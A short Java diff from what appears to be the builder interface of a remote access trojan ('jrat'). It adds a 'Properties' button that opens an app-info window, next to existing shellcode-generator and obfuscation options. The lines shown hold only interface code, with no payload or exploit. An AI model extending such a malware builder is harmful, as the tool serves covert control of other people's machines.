@@ -16,6 +16,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import su.jrat.client.Globals;
 import su.jrat.client.Help;
 import su.jrat.client.ShellcodeGenerator;
+import su.jrat.client.ui.frames.FrameAppInfo;
 import su.jrat.client.ui.frames.FrameExecutableInfo;
 import su.jrat.client.ui.frames.FrameObfuscationInfo;
 
@@ -25,6 +26,7 @@ public class PanelBuildOutput extends JPanel {
 
 	public FrameExecutableInfo frameExecutableInfo = new FrameExecutableInfo();
 	public FrameObfuscationInfo frameObfuscationInfo = new FrameObfuscationInfo();
+	public FrameAppInfo frameAppInfo = new FrameAppInfo();
 	
 	private final ButtonGroup buttonGroup = new ButtonGroup();
 	private final ButtonGroup buttonGroup_1 = new ButtonGroup();
@@ -166,6 +168,11 @@ public class PanelBuildOutput extends JPanel {
 		buttonGroup.add(rdbtnapposX);
 		
 		JButton btnProperties = new JButton("Properties");
+		btnProperties.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				frameAppInfo.setVisible(true);
+			}
+		});
 		
 		
 		GroupLayout groupLayout = new GroupLayout(this);
